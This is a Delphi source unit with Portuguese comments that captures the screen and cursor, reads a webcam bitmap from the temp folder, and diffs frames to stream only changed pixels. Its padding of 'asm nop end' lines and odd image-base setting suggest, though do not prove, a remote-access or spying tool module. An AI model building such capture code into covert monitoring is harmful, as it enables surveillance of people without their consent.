{$IMAGEBASE 61234589}
unit Stream;

interface

uses
  Windows, Classes, Graphics;

  function infCurs: TCursorInfo;
  procedure CapTelabmp(Nome: TMemoryStream);
  procedure CompararStr(Primeiro, Segundo, Compara: TMemoryStream; op:Byte);

implementation

function SysTempDir: string;
begin
  SetLength(Result, MAX_PATH);
  if GetTempPath(MAX_PATH, PChar(Result)) > 0 then
  Result := string(PChar(Result))
  else
  Result := '';
end;

function infCurs: TCursorInfo;
var
 hWindow: HWND;
 pt: TPoint;
// pIconInfo: TIconInfo;
 dwThreadID, dwCurrentThreadID: DWORD;
begin
  asm nop end;
  Result.hCursor := 0;
  ZeroMemory(@Result, SizeOf(Result));
  if GetCursorPos(pt) then
  begin
    Result.ptScreenPos := pt;
    hWindow := WindowFromPoint(pt);
    if IsWindow(hWindow) then
    begin
      dwThreadID := GetWindowThreadProcessId(hWindow, nil);
      dwCurrentThreadID := GetCurrentThreadId;
      if (dwCurrentThreadID <> dwThreadID) then
      begin
        if AttachThreadInput(dwCurrentThreadID, dwThreadID, True) then
        begin
          Result.hCursor := GetCursor;
          AttachThreadInput(dwCurrentThreadID, dwThreadID, False);
        end;
      end else
        Result.hCursor := GetCursor;
    end;
  end;
end;

// Captura a tela
procedure CapTelabmp(Nome: TMemoryStream);
var
  image: TBitmap;
  canvas: TCanvas;
  DC: HDC;
  R: TRect;
  CursInfo:TCursorInfo;
  Curs: TIcon;
  Icon: TIconInfo;
begin
  asm nop end;
  Curs := TIcon.Create;
  CursInfo := infCurs();
  image := TBitmap.Create;
  canvas := TCanvas.Create;
  dc := GetWindowDC(0);
  try
    canvas.Handle := dc;
    R := Rect(0, 0, GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));
    image.Width := R.Right;
    image.Height := R.Bottom;
    image.Canvas.CopyRect(R, canvas, R);
  finally
    releaseDC(0, dc);
  end;
  canvas.Handle := 0;
  canvas.Free;
 if CursInfo.hCursor <> 0 then begin
    Curs.Handle := CursInfo.hCursor;
    GetIconInfo(CursInfo.hCursor, Icon);
    image.Canvas.Draw(CursInfo.ptScreenPos.X - Icon.xHotspot, CursInfo.ptScreenPos.Y - Icon.yHotspot, Curs);
  end;
  image.PixelFormat := pf8bit;
  image.SaveToStream(Nome);
  Curs.ReleaseHandle;
  Curs.Free;
  image.Free;
end;

procedure capWebcam(Nome: TMemoryStream);
var
  image: TBitmap;
begin
  image := TBitmap.Create;
  image.LoadFromFile(SysTempDir+'temp.bmp');
  image.SaveToStream(Nome);
  image.Free;
end;
// Compara as Streams e as Separam quando os Pixels da Bitmap forem iguais.
procedure CompararStr(Primeiro, Segundo, Compara: TMemoryStream; op:Byte);
var
  count: integer;
  AC1, AC2, AC3: ^AnsiChar;
begin
  asm nop end;
  Segundo.Clear;
  Compara.Clear;
  if(op=0)then
    CapTelabmp(Segundo)
  else
    capWebcam(Segundo);
  AC1 := Primeiro.Memory;
  AC2 := Segundo.Memory;
  Compara.SetSize(Primeiro.Size);
  AC3 := Compara.Memory;

  for count := 0 to Primeiro.Size - 1 do
  begin
    if AC1^ = AC2^ then
      AC3^ := '0'
    else
      AC3^ := AC2^;
    Inc(AC1);
    Inc(AC2);
    Inc(AC3);
  end;
  Primeiro.Clear;
  Primeiro.CopyFrom(Segundo, 0);
end;

end.
